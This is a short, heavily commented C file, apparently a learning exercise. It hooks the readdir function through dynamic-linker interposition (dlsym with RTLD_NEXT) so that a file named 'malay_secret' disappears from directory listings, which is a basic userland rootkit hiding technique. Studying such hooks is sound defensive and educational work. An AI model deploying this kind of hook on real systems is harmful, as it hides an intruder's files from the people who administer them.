#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h> 
#include <stdio.h>

const char *hidden_file = "malay_secret" ; 

// In this context, the asterisk before the function name readdir indicates that the function returns a pointer to a struct dirent.
struct dirent* readdir(DIR *dirp) {

    /*
    
    ** Obtain the address of the original readdir function using dlsym, and then call it to get the next directory entry.
    
    ** dlsym allows us to obtain the address of a function within a shared object/library at runtime.
      Using RTLD_NEXT handle in dlsym, we can find and invoke the original readdir function. 

    (*original_readdir): The parentheses around *original_readdir are crucial.
                         They indicate that original_readdir is a pointer to a function, not a function itself. In C, when declaring a pointer to a function,
    the asterisk must be enclosed in parentheses to avoid confusion with the declaration of a function that returns a pointer.
    (DIR *): This part indicates the parameter type of the function that original_readdir points to.
             In this case, it points to a function that takes a single argument of type DIR*, 
             which is a pointer to a DIR structure representing a directory stream.
    */
    struct dirent*(*original_readdir_function)(DIR *) = dlsym(RTLD_NEXT, "readdir");


    // Pointer to the current dirent structure (represent the next direcrory entry  in the directory stream pointed by dirp)
    struct dirent *entry  = original_readdir_function(dirp);

    if(entry == NULL )
        return NULL;
    
    
    if (strcmp(entry->d_name, hidden_file) == 0 ){
        printf("[-] Found hidden file in current directory -> not printing it");
        // We want to skip this evil entry so i moving to the next entry in dirp stream... 
        entry = original_readdir_function(dirp);
    }
        
    return entry;
}